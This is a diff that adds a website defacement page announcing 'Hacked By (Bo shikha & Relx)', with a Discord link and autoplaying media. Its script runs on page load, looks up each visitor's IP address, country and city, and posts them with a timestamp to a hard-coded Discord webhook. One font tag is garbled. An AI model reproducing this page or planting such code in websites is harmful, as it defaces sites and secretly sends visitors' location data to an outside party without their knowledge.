@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Hacked by 5-1">
+  <meta http-equiv="cache-control" content="index,cache">
+  <meta http-equiv="pragma" content="index,cache">
+  <title>5-----1</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: black; 
+      font-family: 'monospace';
+      flex-direction: column; 
+    }
+    .bg-video {
+      width: 60%; 
+      height: auto; 
+      z-index: 1;
+    }
+    .content {
+      color: white;
+      text-align: center;
+      z-index: 2;
+      margin-top: 20px; 
+    }
+    h1, p, font, marquee, #clock {
+      text-shadow: 0 0 4px rgba(0, 0, 0, 0.8);
+    }
+    a:link {
+      text-decoration: none;
+    }
+  </style>
+
+  <script>
+    function playSound() {
+      var audio = document.querySelector("audio");
+      audio.play();
+    }
+
+    async function fetchIP() {
+      try {
+        let response = await fetch('https://api.ipify.org?format=json');
+        let data = await response.json();
+        let ip = data.ip;
+        document.getElementById('ip-address').innerHTML = 'IP: ' + ip;
+      } catch (error) {
+        console.error('Error fetching IP address:', error);
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', fetchIP);
+  </script>
+</head>
+
+<body onclick="playSound()" onmouseover="playSound()">
+  <!--  -->
+  <video class="bg-video" autoplay loop muted>
+    <source src="https://cdn.discordapp.com/attachments/1276895317002031188/1291759923927191583/Recording_2024-09-29_175440.mp4?ex=670bd0ad&is=670a7f2d&hm=917e17512d740eee1adb1e49e0400d625ead550d27e0aeeab028f364d3bc66c3&" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+
+  <!--  -->
+  <audio src="https://cdn.discordapp.com/attachments/1276895317002031188/1292210971758297098/Recording_2024-10-03_150440.mp4?ex=670b7a7f&is=670a28ff&hm=e1010d81b904e06eb304ed3b47be5d5277ccc0e698c5afc027f9adaa1ff1f0c0&" loop></audio>
+
+  <!--  -->
+  <div class="content">
+    <h1><font color="#f30404">Hacked By (Bo shikha & Relx)</font></h1>
+    <p><font color="#c9cdd2ا</font></p>
+    <a href="https://discord.gg/205" style="font-size: 30px; color: rgb(221, 4, 4);">Discord.gg/5-1</a>
+    <div id="clock"></div>
+    <div id="ip-address" style="color:#ff0000; margin-top: 5px;">...</div>
+  </div>
+
+  <script>
+    setInterval(showTime, 1000); // 
+
+    //  IP 
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        const { ip, country, city } = data;
+        const dateTime = new Date().toLocaleString();
+        const webhookUrl = 'https://canary.discord.com/api/webhooks/1272243171002155171/1VplgHFEFQeh83OCY5rmFk7cKHzmj6LjPfBsCUXcPLPSr9jQFGrO3YeTgisQeDtMM1E8';
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({content: `IP: ${ip}\nCountry & City: ${country} - ${city}\nDate & Time: ${dateTime}`})
+        });
+      });
+  </script>
+
+</body>
+</html>
